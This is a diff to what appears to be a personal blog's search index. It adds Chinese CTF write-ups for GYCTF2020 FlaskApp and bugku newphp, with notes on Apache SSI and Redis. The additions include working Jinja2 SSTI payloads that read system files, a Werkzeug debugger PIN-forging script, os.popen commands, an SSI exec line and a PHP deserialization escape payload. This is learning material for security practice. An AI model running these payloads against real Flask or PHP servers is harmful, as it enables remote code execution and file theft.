@@ -707,7 +707,9 @@ $.ajax(&#123;
     <url>/2021/09/01/buu/17/</url>
     <content><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p>
 <p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/Alexhcf/article/details/108400293">(1条消息) GYCTF2020 FlaskApp_汗的博客-CSDN博客</a></p>
 <p>最近刚学了模板注入，这题就直接顺着flask的payload去</p>
+<p>打payload时要注意输入一整行内容</p>
 <p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p>
 <p>试着用简单的payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -725,11 +727,50 @@ $.ajax(&#123;
 <p>果断上网查了文章，发现PIN还挺难得到的</p>
 <p>主要是python脚本不会写。。。</p>
 <p>接下来按照正常解题流程：</p>
-<p>payload1</p>
+<h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>payload1获取mac地址</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
 <p>得到</p>
-<p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>
+<p><img src="/2021/09/01/buu/17/image-20211028183617395.png" alt="image-20211028183617395"></p>
+<p>进行16进制到10进制的转换<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
+<p>或者python代码实现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(int(&#39;02:42:ac:10:8a:db&#39;,16))</span><br></pre></td></tr></table></figure>
+
+<p>得到：2485377862363</p>
+<p>接着获取id，读取<code>/proc/self/cgroup</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/2021/09/01/buu/17/image-20211028183832593.png" alt="image-20211028183832593"></p>
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">结果 ： 12:pids:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 11:devices:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 10:rdma:&#x2F; 9:memory:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 8:blkio:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 7:cpu,cpuacct:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 6:net_cls,net_prio:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 5:hugetlb:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 4:cpuset:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 3:perf_event:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 2:freezer:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 1:name&#x3D;systemd:&#x2F;docker&#x2F;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38 0::&#x2F;system.slice&#x2F;containerd.service</span><br></pre></td></tr></table></figure>
+
+<p>将得到的机器id和mac地址放进脚本跑pin码</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment">#服务器运行flask所登录的用户名</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>,<span class="comment">#flask库下app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377862363&#x27;</span>,<span class="comment">#当前网络的mac地址的十进制数</span></span><br><span class="line">    <span class="string">&#x27;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38&#x27;</span><span class="comment">#机器的id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<p>记住要在脚本开头加上utf-8句子，不然会报错# encoding: utf-8</p>
+<p><img src="/2021/09/01/buu/17/image-20211028184228753.png" alt="image-20211028184228753"></p>
+<p><strong>PIN:    562-831-713</strong></p>
+<p>在报错页面选择进入命令行，输入pin</p>
+<p><img src="/2021/09/01/buu/17/image-20211028184419952.png" alt="image-20211028184419952"></p>
+<p>进入之后在输入以下指令：</p>
+<p>os.popen() 方法用于从一个命令打开一个管道。</p>
+<p>语法格式：</p>
+<p>os.popen(command[, mode[, bufsize]])</p>
+<p><img src="/2021/09/01/buu/17/image-20211028185034014.png" alt="image-20211028185034014"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&quot;ls -l &#x2F;&quot;).read()</span><br><span class="line">os.popen(&quot;cat &#x2F;this_is_the_flag.txt&quot;).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/01/buu/17/image-20211028184721243.png" alt="image-20211028184721243"></p>
+<h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>字符串拼接绕过<br>从 black list大致知道了关键字，另外会将字符转小写，所以没法通过lower方法或者base64、hex一下绕过，但是最常见的是字符串拼接绕过，参考菜鸟教程找到os模块的一些方法<br>先使用listdir方法看看当前目录文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加密解密结果</p>
+<p>结果 ： [&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;]</p>
+<p>其中this_is_the_flag.txt有flag字样，那么接下来就是想办法读这个文件，还是采用拼接字符串的方式，然后结合内建函数open，菜鸟教程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
 ]]></content>
       <tags>
         <tag>buu</tag>
@@ -772,9 +813,7 @@ $.ajax(&#123;
 <p>这里有一个知识点</p>
 <p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p>
 <p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p>
-<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p>
-<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
-<p>username成为注入点</p>
+<p><img src="/2021/09/02/buu/18/image-20211028185301599.png" alt="image-20211028185301599"></p>
 <!--#exec cmd="whoami"-->
 
 <p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p>
@@ -4733,6 +4772,7 @@ public function __toString()&#123;
     <title>天翼杯 2021 esay_eval</title>
     <url>/2021/10/26/nss/1/</url>
     <content><![CDATA[<p> 题目标签：<strong>反序列化、主从复制、RCE、redis</strong></p>
+<p>文章学习：<a href="http://pipinstall.cn/2020/12/08/Redis%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/">Redis攻击简单总结 - ttpfx’s blog (pipinstall.cn)</a></p>
 <p>开启靶机是代码展现</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method,$args</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,$_REQUEST[<span class="string">&#x27;poc&#x27;</span>],$ret);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($ret[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($ret[<span class="number">1</span>] <span class="keyword">as</span> $i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(intval($i)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -4794,6 +4834,31 @@ public function __toString()&#123;
 ]]></content>
       <tags>
         <tag>nss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>字符串逃逸</title>
+    <url>/2021/10/28/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[<p> 今天也是写了好多到web题，感觉bugku上的两题ssti有点坑，一直说我的pin是错的</p>
+<p>咳咳，回到正题，写一下newphp题目，这题有关字符串反序列化逃逸</p>
+<p><a href="https://www.cnblogs.com/c0d1/p/14900076.html">bugku-newphp - c0d1 - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hint;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$hint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hint = $hint;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;hint)); </span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username, $password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $tmp;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $data);</span><br><span class="line">    $tmp = $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $tmp;</span><br><span class="line">    $data = $tmp;</span><br><span class="line">    $r = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$tmp = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$a = serialize(<span class="keyword">new</span> User($username, $password));</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/is&#x27;</span>,$a))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line">unserialize(read(write($a)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很容易通过代码审计知道，我们要通过evil类来达到访问hint.php的目的</p>
+<p>但是evil类是没有传参数据的，所以需要触发User类来传递数据</p>
+<p>绕开wakeup函数</p>
+<p><img src="/2021/10/28/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028202324364.png" alt="image-20211028202324364"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/28/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028203903753.png" alt="image-20211028203903753"></p>
+<p><img src="/2021/10/28/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028203932607.png" alt="image-20211028203932607"></p>
+<p>访问index.cgi</p>
+<p>存在ssrf</p>
+<p><img src="/2021/10/28/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028204012795.png" alt="image-20211028204012795"></p>
+<p><img src="/2021/10/28/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028204157176.png" alt="image-20211028204157176"></p>
+]]></content>
+      <tags>
+        <tag>web</tag>
       </tags>
   </entry>
 </search>
